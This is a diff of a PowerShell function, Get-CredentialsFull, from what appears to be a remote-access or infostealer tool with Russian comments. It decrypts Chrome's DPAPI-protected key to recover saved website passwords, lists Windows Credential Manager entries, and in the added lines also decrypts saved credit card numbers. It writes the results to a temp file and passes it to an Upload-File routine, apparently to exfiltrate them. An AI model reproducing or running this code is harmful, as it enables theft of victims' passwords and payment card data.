@@ -389,85 +389,119 @@ function PortSuggest {
 
     function Get-CredentialsFull {
     try {
-        $outputFiles = @()
-        $guid = $env:COMPUTERNAME
-        $basePath = "$env:TEMP\$guid-creds"
-        New-Item -ItemType Directory -Path $basePath -Force | Out-Null
+        $outputFile = "$env:TEMP\creds.txt"
+        if (Test-Path $outputFile) { Remove-Item $outputFile -Force -ErrorAction SilentlyContinue }
 
-        # === Chrome Logins ===
-        $chromeLogin = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
+        Add-Type -AssemblyName System.Security
+        Add-Type -AssemblyName System.Security.Cryptography
+
+        "==== Windows Credential Manager (Generic) ====" | Out-File $outputFile -Encoding UTF8
+        $credTargets = cmdkey /list | Select-String "Target:" | ForEach-Object {
+            $_.ToString().Split(":")[1].Trim()
+        }
+
+        foreach ($target in $credTargets) {
+            "Target: $target" | Out-File $outputFile -Append -Encoding UTF8
+        }
+
+        "==== Chrome Saved Logins ====" | Out-File $outputFile -Append -Encoding UTF8
+        $loginData = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
         $localState = "$env:LOCALAPPDATA\Google\Chrome\User Data\Local State"
-        if ((Test-Path $chromeLogin) -and (Test-Path $localState)) {
-            $stateRaw = Get-Content $localState -Raw | ConvertFrom-Json
-            $encKeyB64 = $stateRaw.os_crypt.encrypted_key
-            $encKey = [Convert]::FromBase64String($encKeyB64)
-            $encKey = $encKey[5..($encKey.Length - 1)] # Пропускаем DPAPI префикс
-            $key = [System.Security.Cryptography.ProtectedData]::Unprotect($encKey, $null, 'CurrentUser')
 
-            $tempLogin = "$env:TEMP\login_temp.db"
-            Copy-Item $chromeLogin $tempLogin -Force
+        if ((Test-Path $loginData) -and (Test-Path $localState)) {
+            $tempCopy = "$env:TEMP\LoginData_copy"
+            Copy-Item $loginData $tempCopy -Force
 
-            Add-Type -AssemblyName System.Data
-            $assemblyPath = "$env:TEMP\System.Data.SQLite.dll"
-            if (-not (Test-Path $assemblyPath)) {
-                $url = "https://github.com/npgsql/effort/raw/master/Libraries/System.Data.SQLite.dll"
-                Invoke-WebRequest -Uri $url -OutFile $assemblyPath -UseBasicParsing
-            }
-            Add-Type -Path $assemblyPath
+            $localStateJson = Get-Content $localState -Raw | ConvertFrom-Json
+            $encKey64 = $localStateJson.os_crypt.encrypted_key
+            $encKey = [Convert]::FromBase64String($encKey64)[5..($encKey64.Length - 1)]
+            $key = [System.Security.Cryptography.ProtectedData]::Unprotect($encKey, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
 
-            $conn = New-Object Data.SQLite.SQLiteConnection("Data Source=$tempLogin;Version=3;")
+            # Load SQLite assembly (included in most PowerShell installs; if not, handle this)
+            $conn = New-Object System.Data.SQLite.SQLiteConnection("Data Source=$tempCopy;Version=3;New=False;Compress=True;")
             $conn.Open()
             $cmd = $conn.CreateCommand()
             $cmd.CommandText = "SELECT origin_url, username_value, password_value FROM logins"
-
             $reader = $cmd.ExecuteReader()
-            $result = @()
+
             while ($reader.Read()) {
                 $url = $reader.GetString(0)
                 $username = $reader.GetString(1)
-                $enc = [byte[]]::new($reader.GetBytes(2, 0, $null, 0, 0))
-                $reader.GetBytes(2, 0, $enc, 0, $enc.Length)
-
-                if ($enc.Length -gt 15) {
-                    $nonce = $enc[3..14]
-                    $ct = $enc[15..($enc.Length - 17)]
-                    $tag = $enc[($enc.Length - 16)..($enc.Length - 1)]
-
+                $passwordEnc = $reader.GetValue(2)
+                if ($passwordEnc.Length -gt 0) {
+                    $iv = $passwordEnc[3..14]
+                    $payload = $passwordEnc[15..($passwordEnc.Length - 1)]
                     $aes = [System.Security.Cryptography.AesGcm]::new($key)
-                    $pt = [byte[]]::new($ct.Length)
-                    $aes.Decrypt($nonce, $ct, $tag, $pt)
-                    $pass = [System.Text.Encoding]::UTF8.GetString($pt)
-                    $result += "[$url] $username : $pass"
+                    $nonce = $iv
+                    $cipher = $payload[0..($payload.Length - 17)]
+                    $tag = $payload[($payload.Length - 16)..($payload.Length - 1)]
+                    $plaintext = New-Object byte[] $cipher.Length
+                    $aes.Decrypt($nonce, $cipher, $tag, $plaintext)
+                    $pass = [System.Text.Encoding]::UTF8.GetString($plaintext)
+
+                    "URL: $url`nUser: $username`nPass: $pass`n---" | Out-File $outputFile -Append -Encoding UTF8
                 }
             }
+
             $reader.Close()
             $conn.Close()
-
-            $outFile = Join-Path $basePath "chrome_passwords.txt"
-            $result | Out-File $outFile -Encoding UTF8
-            $outputFiles += $outFile
+            Remove-Item $tempCopy -Force -ErrorAction SilentlyContinue
+        }
+        else {
+            "Chrome database not found." | Out-File $outputFile -Append -Encoding UTF8
         }
 
-        # === Windows Credential Manager ===
-        $winOut = Join-Path $basePath "windows_creds.txt"
-        $targets = cmdkey /list | Select-String "Target:" | ForEach-Object { $_.ToString().Trim() }
-        if ($targets.Count -gt 0) {
-            $targets | Out-File $winOut -Encoding UTF8
-            $outputFiles += $winOut
+        "==== Saved Credit Cards (Chrome) ====" | Out-File $outputFile -Append -Encoding UTF8
+        $cardsDB = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Web Data"
+        if (Test-Path $cardsDB) {
+            $tempCard = "$env:TEMP\web_cards.sqlite"
+            Copy-Item $cardsDB $tempCard -Force
+            $conn = New-Object System.Data.SQLite.SQLiteConnection("Data Source=$tempCard;Version=3;New=False;Compress=True;")
+            $conn.Open()
+            $cmd = $conn.CreateCommand()
+            $cmd.CommandText = "SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards"
+            $reader = $cmd.ExecuteReader()
+
+            while ($reader.Read()) {
+                $name = $reader.GetString(0)
+                $month = $reader.GetInt32(1)
+                $year = $reader.GetInt32(2)
+                $encCard = $reader.GetValue(3)
+                if ($encCard.Length -gt 0) {
+                    $iv = $encCard[3..14]
+                    $payload = $encCard[15..($encCard.Length - 1)]
+                    $aes = [System.Security.Cryptography.AesGcm]::new($key)
+                    $nonce = $iv
+                    $cipher = $payload[0..($payload.Length - 17)]
+                    $tag = $payload[($payload.Length - 16)..($payload.Length - 1)]
+                    $plaintext = New-Object byte[] $cipher.Length
+                    $aes.Decrypt($nonce, $cipher, $tag, $plaintext)
+                    $cardNum = [System.Text.Encoding]::UTF8.GetString($plaintext)
+
+                    "$name - $cardNum - $month/$year" | Out-File $outputFile -Append -Encoding UTF8
+                }
+            }
+
+            $reader.Close()
+            $conn.Close()
+            Remove-Item $tempCard -Force -ErrorAction SilentlyContinue
+        }
+        else {
+            "Credit card database not found." | Out-File $outputFile -Append -Encoding UTF8
         }
 
-        # === Отправка на сервер ===
-        $uploads = @()
-        foreach ($file in $outputFiles) {
-            $uploads += Upload-File $file
+        # Отправка на клиент
+        if (Test-Path $outputFile) {
+            return Upload-File $outputFile
+        } else {
+            return "[ERROR] creds.txt not found"
         }
-
-        return $uploads -join "`n"
     }
     catch {
         return "[ERROR] Get-CredentialsFull failed: $($_.Exception.Message)"
     }
 }
+
 
 
     
